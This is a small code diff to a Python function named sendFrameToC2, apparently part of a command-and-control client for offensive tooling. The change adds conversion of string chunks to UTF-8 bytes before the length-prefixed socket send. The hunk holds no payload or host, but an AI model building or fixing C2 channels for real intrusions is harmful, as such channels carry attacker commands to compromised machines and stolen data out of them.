@@ -24,6 +24,8 @@ def createSocket():
 
 
 def sendFrameToC2(sock, chunk):
+    if isinstance(chunk, str):
+        chunk = chunk.encode('utf-8')  # Convert string to bytes using UTF-8
     slen = struct.pack('<I', len(chunk))
     sock.sendall(slen + chunk)
 
